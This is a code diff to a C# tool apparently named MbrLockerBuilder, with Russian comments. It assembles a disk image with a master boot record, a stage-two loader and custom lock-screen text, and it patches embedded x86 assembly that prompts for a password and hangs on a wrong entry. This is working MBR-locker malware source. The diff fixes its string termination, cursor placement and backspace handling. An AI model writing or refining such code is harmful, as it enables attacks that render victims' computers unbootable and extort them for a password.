@@ -424,7 +424,7 @@ namespace MbrLockerBuilder
                 Array.Copy(stage2Bytes, 0, fullImage, 512 * 3, stage2Bytes.Length);
                 
                 // ============================================================
-                // ЗАПИСЫВАЕМ ТЕКСТ В ОТДЕЛЬНЫЕ СЕКТОРА (4, 5, 6)
+                // ЗАПИСЫВАЕМ ТЕКСТ В ОТДЕЛЬНЫЕ СЕКТОРА (4, 5, 6) С ТЕРМИНАЛЬНЫМ НУЛЕМ
                 // ============================================================
                 
                 string title = this.txtTitle.Text.Trim();
@@ -436,19 +436,15 @@ namespace MbrLockerBuilder
                 string formattedTitle = "     " + title + "     \r\n";
                 string formattedBody = body.Replace("\n", "\r\n");
 
-                string fullText = border + formattedTitle + border + "\r\n" + formattedBody;
-
-                byte[] textBytes = Encoding.GetEncoding(866).GetBytes(fullText);
-                if (textBytes.Length > 512 * 3)
-                {
-                    Array.Resize(ref textBytes, 512 * 3);
-                }
-
-                byte[] titleBytes = Encoding.GetEncoding(866).GetBytes(border + formattedTitle + border + "\r\n");
+                // --- Заголовок (сектор 4) с терминальным нулём ---
+                string titleText = border + formattedTitle + border + "\r\n\0";
+                byte[] titleBytes = Encoding.GetEncoding(866).GetBytes(titleText);
                 if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
                 Array.Copy(titleBytes, 0, fullImage, 512 * 4, titleBytes.Length);
-                
-                byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(formattedBody);
+
+                // --- Основной текст (сектора 5-6) с терминальным нулём ---
+                string bodyText = formattedBody + "\0";
+                byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(bodyText);
                 if (bodyBytes.Length > 512 * 2) Array.Resize(ref bodyBytes, 512 * 2);
                 Array.Copy(bodyBytes, 0, fullImage, 512 * 5, bodyBytes.Length);
 
@@ -549,7 +545,7 @@ namespace MbrLockerBuilder
         }
 
         // ============================================================
-        // НОВЫЕ МЕТОДЫ ДЛЯ ЗАГРУЗКИ ASM ИЗ РЕСУРСОВ
+        // МЕТОДЫ ДЛЯ ЗАГРУЗКИ ASM ИЗ РЕСУРСОВ
         // ============================================================
 
         private string GenerateMBR()
@@ -710,6 +706,12 @@ start_stage2:
     mov si, 0x9200
     call print
 
+    mov ah, 0x02
+    mov bh, 0
+    mov dh, 24
+    mov dl, 0
+    int 0x10
+
     mov si, msg_prompt
     call print
 
@@ -793,6 +795,8 @@ get_password:
     je .done
     cmp al, 0x08
     je .backspace
+    cmp al, 0x7F
+    je .backspace
     cmp di, buffer + 64
     je .loop
     stosb
@@ -814,6 +818,11 @@ get_password:
     jmp .loop
 .done:
     mov byte [di], 0
+    mov ah, 0x0E
+    mov al, 0x0A
+    int 0x10
+    mov al, 0x0D
+    int 0x10
     ret
 
 check_password:
@@ -839,7 +848,7 @@ hang:
     jmp hang
 
 msg_prompt:
-    db 13,10,'Password: ',0
+    db 'Password: ',0
 msg_wrong:
     db 13,10,'Wrong password!',13,10,0
 msg_error:
